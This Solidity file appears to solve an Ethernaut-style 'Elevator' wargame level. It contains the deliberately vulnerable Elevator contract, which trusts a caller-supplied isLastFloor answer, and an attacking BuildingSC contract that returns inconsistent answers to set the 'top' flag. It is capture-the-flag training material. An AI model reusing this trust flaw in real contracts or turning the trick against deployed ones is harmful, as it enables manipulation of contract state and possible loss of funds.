import "hardhat/console.sol";

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external view returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface IElevator {
    function goTo(uint _floor) external;

    function floor() external view returns (uint);
}

contract BuildingSC {
    IElevator elevator;

    constructor(address _elevatorAddress) {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint) external view returns (bool) {
        if (elevator.floor() == 0) {
            return false;
        }
        return true;
    }

    function callGoTo(uint _floor) public {
        elevator.goTo(_floor);
    }
}
